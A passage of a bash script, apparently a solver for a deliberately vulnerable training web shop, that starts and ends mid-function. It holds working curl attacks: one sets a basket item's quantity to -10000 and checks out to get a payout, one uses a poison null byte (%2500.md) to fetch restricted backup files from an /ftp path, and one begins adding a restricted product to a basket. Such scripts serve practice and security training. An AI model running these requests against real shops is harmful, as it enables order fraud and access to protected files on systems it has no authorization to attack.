    local BITEM_ID=$(curl -sS "$BASE_URL/rest/basket/$BID" -H "Authorization: Bearer $TOKEN" | grep -o '"id":[0-9]*,"ProductId":1' | head -1 | cut -d: -f2 | cut -d, -f1)

    if [ -z "$BITEM_ID" ]; then echo "[!] Could not find item in basket."; return; fi

    echo "[-] Updating quantity to negative for Item ID: $BITEM_ID..."
    curl -sS -X PUT "$BASE_URL/api/BasketItems/$BITEM_ID" \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      -d '{"quantity":-10000}'

    echo -e "\n[-] Checking out..."
    curl -sS -X POST "$BASE_URL/rest/basket/$BID/checkout" \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json"

    echo -e "\n[+] Payback Time sequence complete."
}

function null_byte() {
    echo "[-] Attempting Poison Null Byte..."
    curl -sS "$BASE_URL/ftp/eastere.gg%2500.md" > /dev/null
    curl -sS "$BASE_URL/ftp/package.json.bak%2500.md" > /dev/null
    echo "[+] Requests sent."
}

function christmas() {
    local TOKEN=$1
    local BID=$2
    if [ -z "$TOKEN" ] || [ -z "$BID" ]; then echo "Usage: christmas <token> <basket_id>"; return; fi

    echo "[-] Adding Christmas Special (Product 10) to basket..."
